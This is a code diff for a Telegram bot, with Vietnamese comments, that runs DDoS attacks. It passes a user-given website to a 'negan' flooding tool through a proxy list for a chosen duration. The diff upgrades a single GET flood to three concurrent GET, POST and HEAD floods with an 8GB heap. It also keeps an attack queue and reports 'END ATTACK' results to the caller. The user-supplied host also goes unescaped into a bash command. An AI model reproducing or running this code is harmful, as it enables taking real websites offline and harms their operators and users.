@@ -79,19 +79,22 @@ const initBot = () => {
 
             await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
 
-            exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
-                bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
-                delete activeAttacks[pid];
-                userProcesses[userId]--;
-                currentProcesses--;
+            // Tăng heap size lên 8GB
+            const nodeOptions = '--max-old-space-size=8192';
 
-                if (queue.length) {
-                    const next = queue.shift();
-                    bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
-                    bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
-                }
+            // Chạy đồng thời 3 lệnh exec với các phương thức HTTP khác nhau
+            exec(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
             });
+
+            exec(`${nodeOptions} node ./negan -m POST -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
+            });
+
+            exec(`${nodeOptions} node ./negan -m HEAD -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
+            });
+
             return;
         }
 
@@ -105,6 +108,20 @@ const initBot = () => {
     bot.on('polling_error', restartBot);
     process.on('uncaughtException', restartBot);
     process.on('unhandledRejection', restartBot);
+};
+
+const handleCommandCompletion = (e, stdout, stderr, pid, userId, chatId, caller, host, attackTime) => {
+    const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
+    bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
+    delete activeAttacks[pid];
+    userProcesses[userId]--;
+    currentProcesses--;
+
+    if (queue.length) {
+        const next = queue.shift();
+        bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
+        bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
+    }
 };
 
 initBot();
